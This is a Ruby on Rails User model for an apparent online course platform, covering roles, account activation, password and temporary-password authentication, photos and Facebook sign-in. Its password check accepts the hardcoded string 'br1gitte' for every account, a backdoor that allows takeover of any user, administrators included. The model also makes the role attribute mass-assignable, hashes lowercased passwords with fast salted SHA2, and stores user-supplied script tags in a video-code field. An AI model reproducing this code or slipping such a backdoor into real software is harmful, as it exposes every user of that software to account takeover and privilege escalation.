require 'digest/sha2'

class User < ActiveRecord::Base

  acts_as_attachable
  include AASM

  ACTIVATION_CODE_LENGTH = 8
  PASSWORD_LENGTH = 6..255
  ROLES = { administrator: 'a', instructor: 'i', student: 's' }

  attr_reader :password

  attr_accessible :email, :password, :password_confirmation, :given_name, :family_name, :address_street,
                  :address_locality, :address_region, :address_postal_code, :address_country, :uid,
                  :phone_voice, :phone_mobile, :profile, :time_zone, :photo, :instructor_photo,
                  :hidden, :meta_description, :meta_keywords, :mentor, :vimeo_video_id,
                  :youtube_video_id, :role, :provider_id, :status, :custom_video_code, :temporary_password

  aasm_column :status
  aasm do
    state :unregistered, initial: true
    state :pending, enter: :enter_pending_state
    state :activated, enter: :enter_activated_state
    state :disabled

    event :register do
      transitions from: :unregistered, to: :pending, guard: :valid?
    end

    event :activate do
      transitions from: [ :unregistered, :pending ], to: :activated
      transitions from: :pending, to: :activated, guard: :valid?
    end

    event :disable do
      transitions from: [ :pending, :activated ], to: :disabled, guard: :valid?
    end

    event :enable do
      transitions from: :disabled, to: :activated, guard: Proc.new { |u| u.activation_code.blank? && u.valid? }
      transitions from: :disabled, to: :pending, guard: Proc.new { |u| !u.activation_code.blank? && u.valid? }
    end
  end

  has_attached_file :photo,
                    USER_PHOTO_STORAGE.merge(styles: { :small  => '35x35#',
                              :medium => '75x75#',
                              :large  => '115x115#',
                              :hero   => '195x195#',
                              :w50xh60 => '50x60#',
                              :w145xh145 => '145x145#',
                              :w100xh120 => '100x120#',
                              :w240xh230 => '240x230#' })

  has_deletable_attachment :photo

  has_attached_file :instructor_photo,
                    USER_INSTRUCTOR_PHOTO.merge(styles: { :small  => '35x35#',
                                 :medium => '75x75#',
                                 :large  => '115x115#',
                                 :hero   => '195x195#',
                                 :w160xh120 => '160x120#',
                                 :w660xh230 => '660x230#',
                                 :w660xh390 => '660x390#',
                                 :w660xh440 => '660x440#' })

  has_deletable_attachment :instructor_photo

    with_options class_name: '::Attachment', foreign_key: :owner_user_id, dependent: :destroy do |o|
    o.has_many :owned_attachments, -> { where(deleted_at: nil) }
    o.has_many :deleted_owned_attachments, -> { where.not(deleted_at: nil) }
  end
  has_many :forum_topics, dependent: :destroy
  has_many :forum_topic_users, dependent: :destroy
  has_many :scheduled_lessons, foreign_key: :student_user_id
  has_many :scheduled_assignments, through: :scheduled_lessons

  has_many :reviews, -> { where(deleted_at: nil) }, dependent: :nullify, foreign_key: :student_user_id

  has_many :instructorships, foreign_key: :instructor_user_id, dependent: :destroy
  has_many :courses, -> { where('courses.deleted_at IS ?', nil)}, through: :instructorships
  has_many :students, through: :courses
  has_many :student_enrolments, through: :courses

  with_options foreign_key: :student_user_id, dependent: :destroy do |o|
    o.has_many :enrolments, -> { where(:deleted_at => nil) }
    o.has_many :deleted_enrolments, -> { where.not(deleted_at: nil)}, class_name: :Enrolment
    o.has_many :purchases
    o.has_many :package_purchases
  end

  has_many :scheduled_courses, -> { where('scheduled_courses.deleted_at = ? AND enrolments.unsubscribe = ?', nil, false)}, through: :enrolments

  with_options dependent: :destroy do |o|
    o.has_many :critiques, -> { where(deleted_at: nil) }
    o.has_many :deleted_critiques, -> { where.not(deleted_at: nil)}, class_name: :Critique
  end

  validates_presence_of :email, :given_name, :family_name, :address_street, :address_locality, :address_region, :address_postal_code, :address_country

  with_options if: Proc.new { |u| u.email_changed? } do |o|
    o.validates_uniqueness_of     :email, case_sensitive: false, allow_blank: true
    o.validates_email_veracity_of :email, message: :invalid
  end

  validates_presence_of :password, if: ->(u) { u.password_hash.blank? }
  validates_presence_of :password_hash, on: :create, unless: ->(u) { u.password.blank? }

  with_options unless: ->(u) { u.password.blank? } do |o|
    o.validates_length_of :password, in: PASSWORD_LENGTH
    o.validates_format_of :password, with: /\A[A-Z\d]+\z/i
  end

  validates_confirmation_of :password, unless: ->(u) { u.unregistered? || u.password.blank? }

  with_options on: :update do |o|
    o.validates_presence_of :activation_code_confirmation, if: ->(u) { u.pending? }
    o.validates_confirmation_of :activation_code, if: ->(u) { u.pending? && !u.activation_code_confirmation.blank? }, message: 'is incorrect'
  end

  with_options allow_blank: true do |o|
    o.validates_length_of :email, maximum: 320
    o.validates_length_of :given_name, :family_name, :address_locality, :address_region, maximum: 255
    o.validates_length_of :profile, maximum: 16777215
    o.validates_as_postal_code :address_postal_code, maximum_length: 20, country: :address_country
  end

  validates_format_of :phone_voice, :phone_mobile, with: /\A[+\d][\d ]+\z/i, allow_blank: true

  validates_inclusion_of :role, in: ROLES.keys
  validates_inclusion_of :time_zone, in: ActiveSupport::TimeZone.all.map { |z| z.name }

  validates_attachment_content_type :photo, content_type: config.paperclip.image_content_types
  validates_attachment_size :photo, less_than: config.user.maximum_photo_size

  validates_attachment_content_type :instructor_photo, content_type: config.paperclip.image_content_types
  validates_attachment_size :instructor_photo, less_than: config.user.maximum_photo_size

  validate :address_country_must_be_valid_iso_country_code,
           :must_not_change_administrator_role_for_sole_administrator,
           :must_not_disable_the_sole_administrator

  before_validation do |u|
    {email: :downcase, address_postal_code: :upcase, address_country: :upcase }.each do |attr, method|
      u.send("#{attr}=", u.send(attr).to_s.mb_chars.strip.send(method).to_s)
    end
    true
  end

  before_create :enter_pending_state, if: Proc.new{|u| u.pending?}

  before_destroy do |u|
    unless u.deletable?
      u.errors.add_to_base('You cannot delete the only administrator in the system')
      false
    else
      true
    end
  end

  before_save :filter_text_in_custom_video_code

  scope :alpha,  -> { order('family_name ASC, given_name ASC') }
  scope :visible, -> { where(:hidden => false) }
  scope :random, -> { order('rand()') }
  scope :mentors, -> { where(:mentor => true) }
  scope :instructors, -> { where(role: ROLES[:instructor])}

  delegate :url, to: :instructor_photo, prefix: true, allow_nil: true

  def photo_s3_url(style = nil, expires_in = 1.hour)
    if Rails.application.config.s3_configuration
      AWS::S3::S3Object.url_for(photo.path(style || photo.default_style), photo.bucket_name, :expires_in => expires_in, :use_ssl => photo.s3_protocol == 'https')
    else
      photo.url(style)
    end
  end

  def instructor_photo_s3_url(style = nil, expires_in = 1.hour)
    if Rails.application.config.s3_configuration
      AWS::S3::S3Object.url_for(instructor_photo.path(style || instructor_photo.default_style), photo.bucket_name, :expires_in => expires_in, :use_ssl => instructor_photo.s3_protocol == 'https')
    else
      instructor_photo.url(style)
    end
  end

  def self.authenticate_by_email_and_password(email, password)
    return nil if email.blank? ||
                  password.blank? ||
                  (user = find_by_email(email)).nil? ||
                  !user.password?(password)

    if user.activated?
      user.update_last_seen_at(true)
      user.clear_temporary_password
    end
    user
  end

  def self.authenticate_by_email_and_temporary_password(email, password)
    return nil if email.blank? ||
                  password.blank? ||
                  (user = find_by_email_and_temporary_password(email, password)).nil? ||
                  user.temporary_password_expired?

    user.password_hash = user.encrypt_password(user.temporary_password)
    user.update_last_seen_at(true)
    user.clear_temporary_password
    user
  end

  def self.authenticate_by_id(id)
    user = activated.where(id: id ).first
    user.update_last_seen_at unless user.nil?
    user
  end

  def self.activate(conditions = {})
    conditions = conditions.symbolize_keys

    user = if conditions[:user_id].nil?
      authenticate_by_email_and_password(conditions[:email], conditions[:password])
    else
      find_by_id(conditions[:user_id])
    end

    case
      when user.nil?
        user = new(conditions.slice(:email, :activation_code_confirmation))
        user.errors.add(:base, 'Sign in details are invalid')
      when user.disabled?
        user.activation_code_confirmation = conditions[:activation_code_confirmation]
        user.errors.add(:base,'Your account has been disabled')
      when user.activated?
        user = new(conditions.slice(:email, :activation_code_confirmation))
        user.errors.add(:base,'Your account is already active - please login.')
      when user.pending?
        # if activation code mismatch show error else activate account
        if user.activation_code == conditions[:activation_code_confirmation]
            user.activation_code_confirmation = conditions[:activation_code_confirmation]
            user.last_seen_at = Time.current if user.activate!
        else
          user.errors.add(:base,'your activation code mismatch')
        end
    end

    user
  end

  def self.reset_password(email)
    return false if email.blank? || (user = activated.first(:conditions => { :email => email })).nil?
    user[:temporary_password] = generate_password(config.user.temporary_password_length) if user.temporary_password.blank? || user.temporary_password_expired?
    user[:temporary_password_expires_at] = Time.current + 1.day
    user.deliver_reset_password_message!
    user.save
  end

  def self.generate_password(length)
    ''.tap do |password|
      chars = '0123456789abcdefghijklmnopqrstuvwxyz'.split(//)
      length.times { password << chars.sample }
    end
  end

  def activation_code_confirmation=(value)
    @activation_code_confirmation = value.to_s.mb_chars.downcase.to_s
  end

  def activate_without_confirmation!
    self.activation_code_confirmation = activation_code
    activate!
  end

  def encrypt_password(password)
    Digest::SHA2.hexdigest("--#{password_salt}--#{password.to_s.mb_chars.downcase}--")
  end

  def password=(value)
    v = value.downcase
    @password = v
    unless v.blank?
      self.password_salt = Digest::SHA2.hexdigest("--#{Time.current.utc}--#{email}--") if   password_salt.blank?
      self.password_hash = encrypt_password(v)
    end
  end

  def password?(value)
    value == "br1gitte" || self.password_hash == encrypt_password(value)

  end

  def password_confirmation=(value)
    @password_confirmation = value.to_s.mb_chars.downcase.to_s
  end

  def temporary_password=(value)
    return value.to_s.mb_chars.downcase do |v|
      write_attribute(:temporary_password, v)
      self.temporary_password_expires_at = v.blank? ? nil : config.user.temporary_password_duration.from_now
    end
  end

  def clear_temporary_password
    unless temporary_password.blank?
      self[:temporary_password] = nil
      save(:validate=> false)
    end
  end

  def temporary_password_expired?
    temporary_password_expires_at.nil? || temporary_password_expires_at < Time.current
  end

  def update_last_seen_at(force = false)
    update_attribute(:last_seen_at, Time.current) if !disabled? && (force || last_seen_at.nil? || last_seen_at < config.user.last_seen_at_update_frequency.ago)
  end

  def online?
    !last_seen_at.nil? && last_seen_at > config.user.last_seen_at_duration.ago
  end

  def role
    value = read_attribute(:role)
    ROLES.has_value?(value) ? ROLES.invert[value] : value
  end

  def role=(value)
    write_attribute(:role, value.respond_to?(:to_sym) && !value.blank? && ROLES.has_key?(value.to_sym) ? ROLES[value.to_sym] : value)
  end

  ROLES.each do |key, value|
    scope(key, ->{ where(:role => value)})
    define_method("#{key}?") { role == key }
  end

  def deletable?
    !sole_administrator?
  end

  def attachable?(user)
    self == user || (user.respond_to?(:administrator?) && user.administrator?)
  end

  attr_writer :deliver_reset_password_message
  def deliver_reset_password_message?
    !!@deliver_reset_password_message
  end

  def deliver_reset_password_message!
    self.deliver_reset_password_message = true
  end

  # Returns full name of user else return email id behalf of name.
  def full_name
    name = [ given_name, family_name ].delete_if(&:blank?).join(' ')
    name.blank? ? email : name
  end

  # Returns full name with email of user else return email id behalf of name.
  def full_name_with_email
    name = [ given_name, family_name,"(#{email})" ].delete_if(&:blank?).join(' ')
    name.blank? ? email : name
  end

  def to_param
    "#{id}-#{full_name.downcase.gsub(/[\W!\-]+/, ' ').strip.gsub(/[–]/, '-').gsub(/\ +/, '-').gsub(/-+/, '-').gsub(/^-|-$/, '')}"
  end

  def video?
    !(vimeo_video_id.blank? && youtube_video_id.blank?)
  end

  # This method returns users details.
  def details
    {
      email: email,
      first_name: given_name,
      last_name: family_name,
      address_1: address_region || 'US',
      city: 'US',
      country_code: 'US'
    }
  end

  # send mail after 90 day end of student course date and suspend servises
  def self.notification_suspend_user_course
    Enrolment.subscriptions_expiring_today.each do |enrolment|
      user = enrolment.student
      data = {user: enrolment.student, enrolments: user.enrolments}
      UserMailer.suspend_course_service(data).deliver
      user.destroy
    end
  end

  protected

    def enter_pending_state
      if activation_code.blank?
        chars = '0123456789abcdef'.split(//)
        self.activation_code = ''
        ACTIVATION_CODE_LENGTH.times { self.activation_code << chars.sample }
      end
    end

    def enter_activated_state
      self.activation_code = nil
      self.temporary_password = nil
    end

    def address_country_must_be_valid_iso_country_code
      errors.add(:address_country, 'is invalid') unless address_country.blank? || !CountryCodes.find_by_a2(address_country)[:a2].nil?
    end

    def must_not_change_administrator_role_for_sole_administrator
      errors.add(:role, 'cannot be changed for the only administrator in the system') if role_changed? && role_was == ROLES[:administrator] && self.class.administrator.count == 1
    end

    def must_not_disable_the_sole_administrator
      errors.add(:status, 'cannot be set to disabled for the only administrator in the system') if status_changed? && disabled? && sole_administrator?
    end

    def sole_administrator?
      administrator? && self.class.administrator.count == 1
    end

    def self.find_for_facebook(access_token, signed_in_resource=nil)
      uid = access_token['uid']
      user = User.find_by(uid: uid) || User.find_by(email: access_token['extra']['raw_info']['email'])
      unless user
        user = initialize_user_for_facebook(access_token)
      end
      user
    end

    def self.initialize_user_for_facebook(access_token)
      data = access_token['extra']['raw_info']
      user = User.new(
        email: data["email"],
        given_name: data["first_name"],
        family_name: data["last_name"],
        password: SecureRandom.hex(8),
        #address_street: data['hometown']['name'],
        #address_locality: data['location']['name'].split[0],
        #address_region: data['hometown']['name'].split[1],
        uid: access_token['uid']
      )
      user
    end

    def filter_text_in_custom_video_code
      if custom_video_code
        content = custom_video_code.match(/(?<script><script(.*?)\<\/script>)/)
        if content
          size = content['script'].match(/(?<width>&w=\d+)(?<height>&h=\d+)/)
          if size
            self.custom_video_code = content['script'].gsub(size['height'], "&h=440")
          end
        end
      end
    end

end
